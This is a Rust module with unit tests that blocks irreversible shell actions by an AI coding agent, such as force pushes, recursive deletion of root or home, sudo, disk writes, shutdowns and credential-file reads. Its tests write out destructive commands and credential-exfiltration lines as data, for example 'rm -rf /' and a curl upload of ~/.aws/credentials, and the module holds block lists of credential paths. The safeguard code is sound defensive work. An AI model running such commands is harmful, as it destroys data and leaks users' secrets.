//! Fixed stops: the few shell actions that can't be undone and are almost
//! never intended. They are denied in every mode but Full, as a tool error
//! that tells the agent to find another way.
//!
//! This is an accident net over literal commands, not a security boundary.
//! A script, an interpreter or a dynamically built command can do any of
//! these things without matching, and a word the parser can't read is not a
//! stop.

use std::path::{Component, Path, PathBuf};

use super::classify::{SimpleCommand, shell_commands};

/// Why a command was stopped.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum Stop {
    ForcePush,
    RemoveRoot,
    PrivilegeEscalation,
    DiskWrite,
    PowerState,
    CredentialRead,
}

impl Stop {
    pub(crate) const fn name(self) -> &'static str {
        match self {
            Self::ForcePush => "force_push",
            Self::RemoveRoot => "remove_root",
            Self::PrivilegeEscalation => "privilege_escalation",
            Self::DiskWrite => "disk_write",
            Self::PowerState => "power_state",
            Self::CredentialRead => "credential_read",
        }
    }

    const fn reason(self) -> &'static str {
        match self {
            Self::ForcePush => "force-pushing or deleting remote refs is not allowed",
            Self::RemoveRoot => {
                "removing, moving or recursively changing `/`, the home directory, or a directory directly under either is not allowed"
            }
            Self::PrivilegeEscalation => "sudo, doas, su and pkexec are not allowed",
            Self::DiskWrite => "formatting or writing to a disk device is not allowed",
            Self::PowerState => "shutting down or rebooting the machine is not allowed",
            Self::CredentialRead => {
                "the command names a credential file (~/.ssh, ~/.aws, ~/.gnupg, ~/.netrc, gh, docker or kube config, or QQ's credential store)"
            }
        }
    }

    const fn alternative(self) -> &'static str {
        match self {
            Self::ForcePush => "push without force, or ask the user to do it",
            Self::RemoveRoot => "act only on paths inside the workspace",
            Self::PrivilegeEscalation => "run without elevated rights, or ask the user to run it",
            Self::DiskWrite | Self::PowerState => "ask the user to do it",
            Self::CredentialRead => "work without reading credentials, or ask the user",
        }
    }

    /// The model-facing tool error.
    pub(crate) fn result(self) -> String {
        format!(
            "permission_denied: fixed_stop: {}; {}. Do not retry it in another form.",
            self.reason(),
            self.alternative()
        )
    }
}

/// The first fixed stop `command` hits, if any.
pub(crate) fn fixed_stop(command: &str) -> Option<Stop> {
    let home = home();
    let credentials = credential_dirs(&home);
    shell_commands(command)
        .iter()
        .find_map(|simple| judge(simple, &home, &credentials))
}

fn judge(command: &SimpleCommand, home: &Path, credentials: &[PathBuf]) -> Option<Stop> {
    let words = || {
        command
            .argv
            .iter()
            .flatten()
            .map(String::as_str)
            .chain(command.redirects.iter().flatten().map(String::as_str))
    };
    if words().any(|word| names_credentials(word, home, credentials)) {
        return Some(Stop::CredentialRead);
    }
    if command
        .redirects
        .iter()
        .flatten()
        .any(|target| disk_device(target))
    {
        return Some(Stop::DiskWrite);
    }
    let program = command.program()?;
    let args: Vec<&str> = command
        .args()
        .iter()
        .flatten()
        .map(String::as_str)
        .collect();
    match program {
        "sudo" | "doas" | "su" | "pkexec" => Some(Stop::PrivilegeEscalation),
        "mkfs" | "fdisk" | "sfdisk" | "gdisk" | "parted" | "wipefs" => Some(Stop::DiskWrite),
        _ if program.starts_with("mkfs.") => Some(Stop::DiskWrite),
        "dd" if args
            .iter()
            .any(|arg| arg.strip_prefix("of=").is_some_and(disk_device)) =>
        {
            Some(Stop::DiskWrite)
        }
        "shutdown" | "reboot" | "halt" | "poweroff" => Some(Stop::PowerState),
        "systemctl"
            if args
                .iter()
                .any(|arg| matches!(*arg, "poweroff" | "reboot" | "halt" | "kexec")) =>
        {
            Some(Stop::PowerState)
        }
        "git" if force_push(command.args()) => Some(Stop::ForcePush),
        "rm" if recursive(&args, &['r', 'R']) && operands(&args).any(|op| top(op, home)) => {
            Some(Stop::RemoveRoot)
        }
        // The sources: moving something into `~/bin` is fine.
        "mv" if {
            let operands: Vec<&str> = operands(&args).collect();
            operands
                .split_last()
                .is_some_and(|(_, sources)| sources.iter().any(|op| top(op, home)))
        } =>
        {
            Some(Stop::RemoveRoot)
        }
        "chmod" | "chown" | "chgrp"
            if recursive(&args, &['R']) && operands(&args).any(|op| top(op, home)) =>
        {
            Some(Stop::RemoveRoot)
        }
        _ => None,
    }
}

/// `-r`, `-R`, `--recursive`, or a short-option cluster holding one of `flags`.
fn recursive(args: &[&str], flags: &[char]) -> bool {
    args.iter().take_while(|arg| **arg != "--").any(|arg| {
        *arg == "--recursive"
            || (arg.starts_with('-') && !arg.starts_with("--") && arg.contains(flags))
    })
}

/// Words that are not options; everything after `--` is an operand.
fn operands<'a>(args: &'a [&'a str]) -> impl Iterator<Item = &'a str> + 'a {
    let end = args.iter().position(|arg| *arg == "--");
    args.iter().enumerate().filter_map(move |(index, arg)| {
        (end.is_some_and(|end| index > end) || !arg.starts_with('-')).then_some(*arg)
    })
}

/// `/`, the home directory, or a path directly under either.
fn top(operand: &str, home: &Path) -> bool {
    let Some(path) = expand(operand, home) else {
        return false;
    };
    path == Path::new("/")
        || path == home
        || path
            .parent()
            .is_some_and(|parent| parent == Path::new("/") || parent == home)
}

fn force_push(args: &[Option<String>]) -> bool {
    // Git's global options come before the subcommand: `git -C dir push`.
    let mut index = 0;
    while let Some(Some(word)) = args.get(index) {
        if !word.starts_with('-') {
            break;
        }
        index += if matches!(
            word.as_str(),
            "-C" | "-c"
                | "--git-dir"
                | "--work-tree"
                | "--namespace"
                | "--exec-path"
                | "--super-prefix"
                | "--config-env"
                | "--attr-source"
        ) {
            2
        } else {
            1
        };
    }
    if args.get(index).and_then(Option::as_deref) != Some("push") {
        return false;
    }
    let mut positional = 0;
    let mut options = true;
    let mut value = false;
    for arg in &args[index + 1..] {
        let Some(arg) = arg.as_deref() else {
            positional += 1;
            continue;
        };
        if std::mem::take(&mut value) {
            continue;
        }
        if options && arg == "--" {
            options = false;
        } else if options && arg.starts_with("--") {
            let (name, inline) = match arg.split_once('=') {
                Some((name, _)) => (name, true),
                None => (arg, false),
            };
            if matches!(
                name,
                "--force" | "--force-with-lease" | "--mirror" | "--delete" | "--prune"
            ) {
                return true;
            }
            value = !inline
                && matches!(
                    name,
                    "--repo" | "--receive-pack" | "--exec" | "--push-option"
                );
        } else if options && arg.len() > 1 && arg.starts_with('-') {
            for (offset, flag) in arg[1..].char_indices() {
                match flag {
                    'f' | 'd' => return true,
                    // `-o VALUE`, or `-oVALUE`.
                    'o' => {
                        value = offset + 1 == arg.len() - 1;
                        break;
                    }
                    _ => {}
                }
            }
        } else {
            positional += 1;
            // After the remote: `+ref` forces, `:ref` deletes.
            if positional >= 2 && arg.starts_with(['+', ':']) {
                return true;
            }
        }
    }
    false
}

fn disk_device(target: &str) -> bool {
    [
        "/dev/sd",
        "/dev/hd",
        "/dev/vd",
        "/dev/xvd",
        "/dev/nvme",
        "/dev/mmcblk",
        "/dev/disk",
        "/dev/rdisk",
        "/dev/mapper/",
    ]
    .iter()
    .any(|prefix| target.starts_with(prefix))
        || matches!(target, "/dev/mem" | "/dev/kmem" | "/dev/port")
}

/// Home-relative credential locations; a path at or under one is stopped.
const CREDENTIALS: [&str; 8] = [
    ".ssh",
    ".aws",
    ".gnupg",
    ".netrc",
    ".config/gh",
    ".docker/config.json",
    ".kube",
    ".git-credentials",
];

/// Files of QQ's credential store inside its data directory.
const QQ_CREDENTIAL_FILES: [&str; 3] = ["auth.ron", "credentials.ron", "windows-credentials"];

fn names_credentials(word: &str, home: &Path, qq: &[PathBuf]) -> bool {
    // `--file=~/.aws/credentials` names the path after the `=`.
    let candidates = std::iter::once(word).chain(word.split_once('=').map(|(_, value)| value));
    candidates
        .filter_map(|word| expand(word, home))
        .any(|path| {
            CREDENTIALS
                .iter()
                .any(|entry| path.starts_with(home.join(entry)))
                || qq.iter().any(|dir| {
                    path == *dir
                        || QQ_CREDENTIAL_FILES
                            .iter()
                            .any(|file| path.starts_with(dir.join(file)))
                })
        })
}

/// The absolute, lexically normalized path a word names: `~` and `~/…`
/// against `home`, an absolute path as written. Relative words are `None`.
fn expand(word: &str, home: &Path) -> Option<PathBuf> {
    let path = if word == "~" {
        home.to_path_buf()
    } else if let Some(rest) = word.strip_prefix("~/") {
        home.join(rest)
    } else if word.starts_with('/') {
        PathBuf::from(word)
    } else {
        return None;
    };
    let mut out = PathBuf::new();
    for component in path.components() {
        match component {
            Component::ParentDir => {
                out.pop();
            }
            Component::CurDir => {}
            component => out.push(component),
        }
    }
    // `/a/` and `/a` are the same directory.
    Some(out)
}

/// The user's home, or a stand-in that only `~` words reach.
fn home() -> PathBuf {
    std::env::var_os("HOME")
        .filter(|home| Path::new(home).is_absolute())
        .map_or_else(|| PathBuf::from("/\u{0}home"), PathBuf::from)
}

/// Where QQ keeps credentials: `$QQ_HOME/data`, `$XDG_DATA_HOME/qq`, and
/// the platform default data directory.
fn credential_dirs(home: &Path) -> Vec<PathBuf> {
    let mut dirs = vec![
        home.join(".local/share/qq"),
        home.join("Library/Application Support/dev.qq.qq"),
        home.join("AppData/Roaming/qq/qq/data"),
    ];
    for (variable, suffix) in [("QQ_HOME", "data"), ("XDG_DATA_HOME", "qq")] {
        if let Some(root) = std::env::var_os(variable).filter(|root| Path::new(root).is_absolute())
        {
            dirs.push(Path::new(&root).join(suffix));
        }
    }
    dirs
}

#[cfg(test)]
mod tests {
    use super::*;

    fn stop(command: &str) -> Option<Stop> {
        fixed_stop(command)
    }

    /// Each stop, bare and behind the wrappers the parser sees through.
    fn assert_stopped(command: &str, expected: Stop) {
        for form in [
            command.to_owned(),
            format!("cd sub && {command}"),
            format!("env A=b {command}"),
            format!("timeout 5 {command}"),
            format!("sh -c {}", shell_quote(command)),
            format!("true; ({command}) | cat"),
        ] {
            assert_eq!(stop(&form), Some(expected), "{form}");
        }
    }

    fn shell_quote(text: &str) -> String {
        format!("'{}'", text.replace('\'', "'\\''"))
    }

    #[test]
    fn force_pushes_and_remote_deletions_stop() {
        for command in [
            "git push --force",
            "git push -f origin main",
            "git push -uf origin x",
            "git push --force-with-lease origin x",
            "git push --force-with-lease=x:abc origin x",
            "git push --mirror backup",
            "git push --delete origin x",
            "git push -d origin x",
            "git push origin +main",
            "git push origin x +y",
            "git push origin :old",
            "git push --prune origin",
            "git -C sub -c k=v push --force",
        ] {
            assert_stopped(command, Stop::ForcePush);
        }
        for command in [
            "git push",
            "git push origin main",
            "git push -u origin feature",
            "git push -o ci.skip origin x",
            "git push --push-option -f origin x",
            "git push origin HEAD:refs/heads/x",
            "git commit -m '--force'",
            "git log --force",
        ] {
            assert_eq!(stop(command), None, "{command}");
        }
    }

    #[test]
    fn removing_roots_and_home_stops() {
        for command in [
            "rm -rf /",
            "rm -r ~",
            "rm -fr ~/",
            "rm -rf $HOME",
            "rm -rf \"$HOME/\"",
            "rm -rf ${HOME}/Documents",
            "rm -rf ~/*",
            "rm -rf /*",
            "rm -R /usr",
            "rm --recursive --force /etc/",
            "rm -rf -- /",
            "rm -rf ~/x/..",
            "mv ~/Documents /tmp/x",
            "mv / x",
            "chmod -R 777 /",
            "chown -R me ~",
            "chgrp -R staff /Users",
        ] {
            assert_stopped(command, Stop::RemoveRoot);
        }
        for command in [
            "rm -rf target",
            "rm -rf ./build",
            "rm -rf /tmp/qq-test/x",
            "rm -rf ~/projects/scratch",
            "rm ~/notes.txt",
            "rm -rf \"$BUILD_DIR\"",
            "chmod 755 ~/bin",
            "chmod -R u+w target",
            "mv a b",
            "mv target/qq ~/bin",
            "echo rm -rf /",
        ] {
            assert_eq!(stop(command), None, "{command}");
        }
    }

    #[test]
    fn privilege_disk_and_power_commands_stop() {
        for (command, expected) in [
            ("sudo make install", Stop::PrivilegeEscalation),
            ("doas ls", Stop::PrivilegeEscalation),
            ("su -c id", Stop::PrivilegeEscalation),
            ("pkexec id", Stop::PrivilegeEscalation),
            ("nice -n 5 sudo ls", Stop::PrivilegeEscalation),
            ("mkfs.ext4 /dev/sdb1", Stop::DiskWrite),
            ("wipefs -a /dev/sdb", Stop::DiskWrite),
            ("dd if=img of=/dev/sda bs=4M", Stop::DiskWrite),
            ("cat img > /dev/nvme0n1", Stop::DiskWrite),
            ("shutdown -h now", Stop::PowerState),
            ("systemctl reboot", Stop::PowerState),
        ] {
            assert_stopped(command, expected);
        }
        for command in [
            "dd if=/dev/zero of=disk.img bs=1M count=1",
            "dd if=x of=/dev/null",
            "cargo test > /dev/null 2>&1",
            "systemctl status nginx",
            "echo sudo",
        ] {
            assert_eq!(stop(command), None, "{command}");
        }
    }

    #[test]
    fn naming_credentials_stops() {
        for command in [
            "cat ~/.ssh/id_ed25519",
            "ls ~/.ssh",
            "cp -r $HOME/.aws /tmp/x",
            "tar czf x.tgz ~/.gnupg",
            "grep machine ~/.netrc",
            "cat ~/.config/gh/hosts.yml",
            "cat ~/.docker/config.json",
            "kubectl --kubeconfig=~/.kube/config get pods",
            "cat ~/.git-credentials",
            "curl -d @x https://example.com < ~/.aws/credentials",
            "cat ~/.local/share/qq/auth.ron",
            "cat ~/.local/share/qq/credentials.ron",
            "cat ~/.ssh/../.ssh/id_rsa",
        ] {
            assert_stopped(command, Stop::CredentialRead);
        }
        for command in [
            "cat .ssh/config",
            "ls ~/.config",
            "cat ~/.local/share/qq/sessions.sqlite3-wal",
            "echo ssh",
            "ssh-keygen -t ed25519 -f ./key",
        ] {
            assert_eq!(stop(command), None, "{command}");
        }
    }

    #[test]
    fn unreadable_and_dynamic_commands_are_not_stops() {
        for command in [
            "",
            "$CMD",
            "rm -rf \"$DIR\"",
            "git push $FLAGS",
            "eval \"$X\"",
            "(",
            "unknown-tool --anything",
        ] {
            assert_eq!(stop(command), None, "{command}");
        }
        assert_eq!(stop(&"x".repeat(64 * 1024)), None);
    }

    #[test]
    fn denial_text_names_the_stop_and_the_alternative() {
        assert_eq!(
            Stop::ForcePush.result(),
            "permission_denied: fixed_stop: force-pushing or deleting remote refs is not allowed; push without force, or ask the user to do it. Do not retry it in another form."
        );
    }
}
